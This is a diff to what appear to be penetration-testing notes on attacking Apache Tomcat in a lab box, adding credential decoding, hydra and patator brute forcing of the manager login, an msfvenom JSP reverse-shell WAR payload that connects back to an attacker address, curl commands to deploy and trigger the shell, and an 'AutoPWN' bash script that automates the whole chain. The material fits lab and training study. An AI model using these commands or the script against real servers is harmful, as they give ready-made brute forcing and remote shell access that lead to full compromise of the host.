@@ -111,6 +111,20 @@ Base64 Decode the value of the Authorization header:
 
 ![Base64 Decode Authorization Header Value](../../.gitbook/assets/base64-decode.png)
 
+Decode in Bash:
+
+```bash
+❯ echo -n 'dG9tY2F0OnMzY3JldA==' | base64 -d
+tomcat:s3cret
+```
+
+Encode in Bash:
+
+```bash
+❯ echo -n 'tomcat:s3cret' | base64
+dG9tY2F0OnMzY3JldA==
+```
+
 **Server Manager** and **Manager App:**
 
 ![](../../.gitbook/assets/manager-gui-401.png)
@@ -130,6 +144,8 @@ After removing the Authorization header we will be prompted with HTTP Basic Auth
 ![](../../.gitbook/assets/http-basic-after-remove-authorization-header.png)
 
 ### Tomcat Bruteforce
+
+#### hydra
 
 ```bash
 ❯ HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
@@ -163,19 +179,20 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-14 14:28:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-14 14:28:38
 ```
 
+#### patator
+
+```bash
+patator http_fuzz auth_type=basic url=http://10.10.10.95:8080/manager/html user_pass=FILE0 0=/opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -x ignore:code=401
+```
+
 ### Tomcat Manager App Reverse Shell
 
 ![](../../.gitbook/assets/tomcat-manager-app.png)
 
 I’ll use msfvenom to create a windows reverse shell that can be caught with nc:
 
-```text
-❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.185 LPORT=9002 -f war > rev_shell-9002.war
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: 324 bytes
-Final size of war file: 52237 bytes
+```bash
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.14 LPORT=1234 -f war -o revshell.war
 ```
 
 I’ll also need to know the name of the JSP page to activate it with curl. I’ll use jar to list the contents of the war.
@@ -222,6 +239,36 @@ whoami
 nt authority\system
 
 C:\apache-tomcat-7.0.88>
+```
+
+An alternative way to upload a file with curl:
+
+```bash
+curl --upload-file revshell.war -u 'tomcat:s3cret' "http://10.10.10.95:8080/manager/text/deploy?path=/ShellNameHere&update=true"
+```
+
+An alternative way to get a shell:
+
+```bash
+curl -i "http://10.10.10.95:8080/ShellNameHere" -L
+```
+
+### Tomcat AutoPWN
+
+```bash
+#!/bin/bash
+
+echo "[+] Generating a Reverse Shell"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.14 LPORT=1234 -f war -o rev_shell_1234.war &>/dev/null
+echo "[+] Enabling job control (this prevents the shell from dying)"
+set -m &>/dev/null
+echo "[+] Uploading the reverse shell file"
+curl --upload-file rev_shell_1234.war -u 'tomcat:s3cret' "http://10.10.10.95:8080/manager/text/deploy?path=/shell&update=true" &>/dev/null
+echo "[+] Setting up a nc listener on port 1234."
+nc -lvnp 1234 &
+echo "[+] Requesting the Reverse Shell."
+curl "http://10.10.10.95:8080/shell" -L &>/dev/null
+fg %1
 ```
 
 ## Tomcat Credentials
